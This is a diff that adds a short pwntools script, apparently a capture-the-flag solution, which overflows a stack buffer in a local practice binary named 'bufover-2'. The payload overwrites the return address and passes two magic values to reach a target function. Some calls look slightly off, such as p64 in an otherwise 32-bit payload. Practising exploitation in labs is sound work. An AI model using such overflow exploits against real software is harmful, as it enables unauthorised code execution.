@@ -1,0 +1,8 @@
+from pwn import*
+
+p=process("./bufover-2")
+p.recv()
+p.sendline(b'A'*(4+0x18)+p32(0x080491c2)+b'a'*4+p64(0x14b4da55)+p32(0xf00db4be))
+print(p.recvuntil("\n"))
+print(p.recv("\n"))
+p.recv()
